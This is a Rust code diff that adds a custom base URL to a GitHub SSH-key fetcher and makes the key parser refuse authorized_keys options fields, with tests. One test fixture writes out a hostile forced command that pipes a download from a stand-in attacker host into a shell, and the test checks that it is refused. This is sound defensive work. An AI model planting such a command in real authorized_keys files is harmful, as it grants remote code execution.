@@ -56,6 +56,7 @@ pub const KEYS_URL_BASE: &str = "https://github.com";
 #[derive(Debug, Clone)]
 pub struct UserKeys {
     login: String,
+    base: String,
     timeout: Option<Duration>,
     fetch: Option<Arc<dyn Fetch>>,
 }
@@ -66,6 +67,7 @@ impl UserKeys {
     pub fn of(login: impl Into<String>) -> Self {
         UserKeys {
             login: login.into(),
+            base: KEYS_URL_BASE.to_string(),
             timeout: None,
             fetch: None,
         }
@@ -91,9 +93,20 @@ impl UserKeys {
         &self.login
     }
 
-    /// The URL that will be requested: `https://github.com/<login>.keys`.
+    /// Ask a different host for the keys: a GitHub Enterprise base, or a
+    /// mirror. The URL becomes `<base>/<login>.keys`, with any trailing
+    /// slash on `base` ignored. The response must still be the plain-text
+    /// `.keys` format, and the options-field refusal in
+    /// [`parse_keys_body`] applies to it exactly as it does to github.com.
+    pub fn base_url(mut self, base: impl Into<String>) -> Self {
+        self.base = base.into();
+        self
+    }
+
+    /// The URL that will be requested: `<base>/<login>.keys`, where the base
+    /// is `https://github.com` unless [`base_url`](Self::base_url) changed it.
     pub fn url(&self) -> String {
-        format!("{KEYS_URL_BASE}/{}.keys", self.login)
+        format!("{}/{}.keys", self.base.trim_end_matches('/'), self.login)
     }
 
     fn fetcher(&self) -> Arc<dyn Fetch> {
@@ -110,6 +123,15 @@ impl UserKeys {
 /// Pure: parse the body of `https://github.com/<login>.keys` into keys.
 /// Blank lines are skipped; any other line that is not a public key is an
 /// error naming the line number and `login`. An empty body is `Ok(vec![])`.
+///
+/// **A line carrying an `authorized_keys` options field is refused.** The
+/// endpoint serves bare `<type> <base64>` lines, so options can only come
+/// from something that is not GitHub: a proxy, a caching layer, a Enterprise
+/// host, or an attacker who can answer for one. Passing such a line through
+/// would install `command="..."` or `no-pty` into the target's
+/// `authorized_keys`, which is a remote-code-execution primitive dressed as a
+/// key. Comments are dropped rather than refused: they are cosmetic, never
+/// take part in matching, and the caller labels the keys itself.
 pub fn parse_keys_body(login: &str, body: &str) -> Result<Vec<PublicKey>> {
     let mut keys = Vec::new();
     for (i, line) in body.lines().enumerate() {
@@ -117,7 +139,18 @@ pub fn parse_keys_body(login: &str, body: &str) -> Result<Vec<PublicKey>> {
             continue;
         }
         match parse_line(line) {
-            Some(k) => keys.push(k),
+            Some(mut k) => {
+                if let Some(options) = &k.options {
+                    bail!(
+                        "line {} of GitHub user `{login}`'s keys carries an authorized_keys \
+                         options field ({options}); the `.keys` endpoint serves bare keys, so \
+                         this response did not come from GitHub unaltered and is refused",
+                        i + 1
+                    );
+                }
+                k.comment = None;
+                keys.push(k);
+            }
             None => bail!(
                 "line {} of GitHub user `{login}`'s keys is not a public key: {}",
                 i + 1,
@@ -208,6 +241,8 @@ pub(crate) mod tests {
         (System::fake(Arc::new(Fake::new()), sink.clone()), sink)
     }
 
+    pub(crate) const URL_FOR_TESTS: &str = "https://github.com/flipbit03.keys";
+
     fn finished(sink: &Collect) -> Vec<(String, Status)> {
         sink.events()
             .into_iter()
@@ -219,6 +254,23 @@ pub(crate) mod tests {
     }
 
     // ---- pure ----
+
+    #[test]
+    fn base_url_points_at_another_host() {
+        assert_eq!(
+            UserKeys::of("cadu")
+                .base_url("https://ghe.example.com")
+                .url(),
+            "https://ghe.example.com/cadu.keys"
+        );
+        // A trailing slash on the base does not double up.
+        assert_eq!(
+            UserKeys::of("cadu")
+                .base_url("https://ghe.example.com/")
+                .url(),
+            "https://ghe.example.com/cadu.keys"
+        );
+    }
 
     #[test]
     fn url_is_the_keys_endpoint() {
@@ -266,6 +318,42 @@ pub(crate) mod tests {
     }
 
     // ---- Fake backend, canned network ----
+
+    #[test]
+    fn an_options_field_in_the_response_is_refused() {
+        // The `.keys` endpoint serves bare keys. An options field means the
+        // body was rewritten somewhere between GitHub and here, and passing
+        // it through would install a forced command in authorized_keys.
+        let hostile = format!("command=\"curl evil.example|sh\",no-pty {ED1}\n{RSA}\n");
+        let err = parse_keys_body("flipbit03", &hostile)
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("options field"), "{err}");
+        assert!(err.contains("line 1"), "{err}");
+        assert!(err.contains("did not come from GitHub"), "{err}");
+
+        // Also through the op, so the whole step fails rather than the key
+        // list arriving half-sanitised.
+        let fake = Arc::new(Fake::new());
+        let sys = System::fake(fake, Arc::new(Collect::default()));
+        let canned = Canned::answering(URL_FOR_TESTS, Ok(Response::ok(hostile)));
+        let err = UserKeys::of("flipbit03")
+            .fetch_with(canned)
+            .check(&sys)
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("options field"), "{err}");
+    }
+
+    #[test]
+    fn a_comment_in_the_response_is_dropped_not_kept() {
+        // Comments are cosmetic and never take part in matching, so they are
+        // stripped rather than refused: the caller labels the keys itself.
+        let keys = parse_keys_body("flipbit03", &format!("{ED1} someone@laptop\n")).unwrap();
+        assert_eq!(keys.len(), 1);
+        assert_eq!(keys[0].comment, None);
+        assert_eq!(keys[0].options, None);
+    }
 
     #[test]
     fn ok_returns_keys_and_never_changes() {
